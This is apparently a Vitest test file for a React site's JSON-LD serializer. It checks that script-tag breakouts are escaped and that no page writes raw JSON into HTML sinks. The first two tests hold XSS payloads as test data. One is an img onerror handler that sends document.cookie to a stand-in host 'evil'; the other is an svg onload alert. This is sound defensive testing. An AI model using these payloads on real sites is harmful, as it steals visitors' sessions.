import { describe, it, expect } from 'vitest';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { serializeJsonLd } from '../src/lib/json-ld';

const SRC = join(__dirname, '../src');

/**
 * JSON-LD blocks are written with dangerouslySetInnerHTML, because that is the
 * only way to emit a <script type="application/ld+json"> from React.
 *
 * JSON.stringify does not make that safe: JSON permits the literal text
 * `</script>` inside a string, but the HTML tokenizer ends the script element
 * there. So any editor-writable field that lands in a JSON-LD object — an event
 * title, a product name, an academy title — could close the block early and have
 * the rest of the string parsed as HTML, in every visitor's browser.
 */
describe('JSON-LD embedding', () => {
  it('neutralises a closing script tag hidden in a title', () => {
    const payload = {
      '@type': 'Event',
      name: 'Machining</script><img src=x onerror="fetch(`//evil/${document.cookie}`)">',
    };
    const out = serializeJsonLd(payload);
    expect(out).not.toMatch(/<\/script/i);
    expect(out).toContain('\\u003c');
  });

  it('keeps the payload intact as data, not as markup', () => {
    const out = serializeJsonLd({ name: '</script><svg onload=alert(1)>' });
    // The decoded value is unchanged: sanitizing must not corrupt the data.
    expect(JSON.parse(out).name).toBe('</script><svg onload=alert(1)>');
  });

  it('escapes the line terminators that break JS but not JSON', () => {
    const out = serializeJsonLd({ name: 'a\u2028b\u2029c' });
    expect(out).toContain('\\u2028');
    expect(out).toContain('\\u2029');
    expect(JSON.parse(out).name).toBe('a\u2028b\u2029c');
  });

  it('leaves ordinary content untouched', () => {
    const data = { '@context': 'https://schema.org', name: 'TITANS of Manufacturing' };
    expect(JSON.parse(serializeJsonLd(data))).toEqual(data);
  });

  it('no page injects raw JSON.stringify into an HTML sink', () => {
    // The regression that matters: if a future page reintroduces
    // __html: JSON.stringify(...), the breakout becomes possible again.
    const offenders: string[] = [];
    const walk = (dir: string) => {
      for (const entry of readdirSync(dir)) {
        const full = join(dir, entry);
        if (statSync(full).isDirectory()) walk(full);
        else if (full.endsWith('.tsx')) {
          const src = readFileSync(full, 'utf8');
          for (const m of src.matchAll(/dangerouslySetInnerHTML=\{\{\s*__html:\s*JSON\.stringify/g)) {
            offenders.push(`${full}: ${m[0]}`);
          }
        }
      }
    };
    walk(SRC);
    expect(offenders).toEqual([]);
  });

  it('the only remaining raw-HTML sink is DOMPurify-sanitized', () => {
    // Lesson HTML is intentionally rendered as HTML, so it must be sanitized.
    const renderer = readFileSync(join(SRC, 'components/learning/lesson-block-renderer.tsx'), 'utf8');
    const sinks = [...renderer.matchAll(/dangerouslySetInnerHTML=\{\{\s*__html:\s*([^}]+)\}\}/g)].map(
      (m) => (m[1] ?? '').trim(),
    );
    expect(sinks.length).toBeGreaterThan(0);
    for (const sink of sinks) expect(sink).toMatch(/^safeHtml\(/);
    // And safeHtml must actually be a real sanitizer, not a stub or an escape.
    expect(renderer).toMatch(/DOMPurify\.sanitize\(/);
  });
});
